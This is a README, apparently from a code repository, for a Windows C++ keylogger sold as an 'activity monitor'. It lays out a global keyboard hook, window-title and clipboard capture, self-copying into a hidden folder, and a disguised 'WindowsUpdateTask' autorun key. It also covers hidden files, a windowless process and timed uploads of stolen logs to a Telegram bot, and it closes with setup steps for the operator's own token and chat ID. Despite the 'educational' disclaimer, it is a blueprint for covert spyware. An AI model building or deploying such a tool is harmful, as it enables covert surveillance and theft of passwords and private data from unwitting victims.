# Win32 Activity Monitor & System Logger (C++)

![C++](https://img.shields.io/badge/Language-C%2B%2B-blue.svg)
![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

A high-performance utility for monitoring activity in Windows. The project demonstrates how to work with low-level system mechanisms, hidden file management, and network data exfiltration.

> **This software is created for educational purposes only.

---

## Tech stack and capabilities

### 1. Event interception (Hooking)
* **Low-Level Keyboard Hook (`WH_KEYBOARD_LL`):** Implemented via a system callback function to capture all keystrokes in the system.
* **Context Awareness:** Automatic detection of active window titles via `GetWindowTextW` to bind actions to specific applications.
* **Clipboard Capture:** Monitoring the clipboard when using system hotkeys.

### 2. Stealth and persistence (Persistence)
* **Self-Relocation:** The program automatically moves itself to a hidden directory. `%APPDATA%\Microsoft\Libs`.
* **Registry Injection:** Autoloading is implemented via the `WindowsUpdateTask` registry key (HKCU).
* **Stealth Mode:** Using the `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM` attributes and working in the Windows subsystem (`/SUBSYSTEM:WINDOWS`), which eliminates the appearance of a console window.

### 3. Network interaction
* **WinInet API:** Using native Windows libraries for HTTPS POST requests.
* **Telegram Integration:** Automatic sending of accumulated logs to the Telegram bot in the form of `.txt` files with identification of the computer name and user.

---

## Data Stream Architecture



1. **Input Layer:** The system message queue is intercepted by a hook.
2. **Buffer Layer:** Data is accumulated in memory to minimize the number of disk writes
3. **Storage Layer:** Logs are encrypted (optional) and written to hidden `.dat` files.
4. **Network Layer:** A separate thread (`std::thread`) checks for internet connection every 5 minutes and sends reports.

---

## Assembly instructions

### Requirements
* Visual Studio 2019/2022 (MSVC).
* Customized architecture x64/x86.

### Setup (Before Compilation)
In the `main.cpp` file, replace the following values ​​with your own:
```cpp
std::string token = "YOUR_TELEGRAM_TOKEN";
std::string chatId = "YOUR_CHAT_ID";
